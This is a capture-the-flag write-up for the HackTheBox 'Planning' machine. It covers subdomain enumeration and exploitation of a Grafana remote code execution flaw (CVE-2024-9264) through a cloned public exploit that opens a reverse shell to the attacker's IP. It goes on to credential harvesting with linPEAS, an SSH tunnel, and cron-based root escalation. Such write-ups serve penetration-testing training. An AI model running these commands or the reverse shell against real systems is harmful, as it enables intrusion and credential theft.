# Planning Machine Writeup

The nmap scan gives us two open ports; SSH (Port 22) and nginx web server (Port 80).
nmap -sCV -T4 10.10.11.68
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image002.png)

Upon enumeration of the directories on the web server, nothing of significance comes up.
gobuster dir -u http://planning.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 --timeout 20s -x html,php
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image004.png)

So, ffuf is used to look for any subdomains the web page might have, and it comes up with Grafana.planning.htb.
ffuf -w ../../seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb -H "Host:FUZZ.planning.htb" -fc 301 -t 100
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image005.png)
 
After discovering the subdomain grafana, it is appended to the hosts file, so we’re able to access it. 
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image007.png)

Going into the webpage, we see it runs V11.0.0 which is vulnerable to RCE (CVE-2024-9264).
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image009.png)
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image011.png)
 
We then use an exploit found on github by z3k0sec, which allows us to RCE into the system using reverse shell.
Git clone https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image0013.png)

The script is then executed and a listener is set up.
Note: To run the script, you will have to install the requests module through pip (pip install requests), in a python virtual environment.
python3 poc.py --url http://grafana.planning.htb/ --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.131 --reverse-port 1234

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image015.png)
  
Upon gaining access to the system, we are root but this user doesn’t contain either of the flags, so linPEAS is ran to look for any sensitive information.
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image017.png)

Upon running linPEAS, the password for the user ‘enzo’ is obtained.
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image019.png)

Able to SSH into enzo, the user flag is obtained.
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image021.png)

linPEAS is ran again, this time in enzo’s user to look for any sensitive files. After which we see some database files.
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image023.png)

Exploring the crontab.db, we find a password for the root user. Looking for active connections, we see a webserver being hosted at port 8000.
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image0025.png)

Using SSH tunnelling we host it in our own machine, at port 8001. It requires a username and password, available from the crontab.db database.
ssh -L 8001:localhost:8000 enzo@10.10.11.68
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image027.png)

The website functions as a cronjobs simulator, executing tasks at a certain time as root. From here we can privilege escalate the enzo’s user as sudo, gaining root privileges.
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image029.png)

After obtaining privileges we are able to obtain the root flag.
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Planning/Screenshots/image031.png)
